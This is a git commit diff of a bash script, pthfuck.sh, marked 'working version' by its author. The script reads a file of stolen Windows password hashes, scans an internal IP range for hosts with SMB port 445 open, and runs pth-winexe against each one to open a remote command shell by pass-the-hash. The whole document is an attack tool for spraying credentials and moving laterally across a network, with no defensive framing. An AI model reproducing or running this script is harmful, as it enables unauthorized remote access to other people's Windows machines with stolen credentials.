65502ab106b30f70982c0bb60145989cf15af7e9
zachsis <zachary.hatsis@gmail.com>
2014-09-09 10:58:14 -0600

    working version. needs to read user input

--- pthfuck.sh
+++ pthfuck.sh
@@ -1,22 +1,13 @@
 #!/bin/bash
-# test hash file
-hashfile="/root/bin/passcrack/227/hashes.txt"
-# actual hash file 
-#hashfile="/root/bin/passcrack/227/hashes"
+hashfile="/root/bin/passcrack/227/hashes"
 
-gethash() { echo ${hashfile} | cut -d":" -f 3,4; }
-#gethash() { awk -F: '{print $3 ":" $4}' < ${hashfile}; }
- 
-getuser() { echo ${hashfile} | cut -d":" -f1 ; }
-#getuser() { awk -F: '{print $1}' < ${hashfile}; }
- 
+for line in $(cat ${hashfile}); do 
+  export smbhash=$(echo $line | awk -F: '{print $3 ":" $4}') 
+  export smbuser=$(echo $line | awk -F: '{print $1}') 
 for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
-   for line in $(cat ${hashfile}); do
-       smbhash=$(gethash $line)
-       smbuser=$(getuser $line)
-      echo "[+]"
-      echo "[+] trying $smbuser@$host with $smbhash"
-      echo "[+]"
-      pth-winexe -U $smbuser%$smbhash //$host cmd
-   done
+        echo "[+]"
+        echo "[+] trying $smbuser@$host with $smbhash"
+        echo "[+]"
+        pth-winexe -U $smbuser%$smbhash //$host cmd; 
+    done
 done
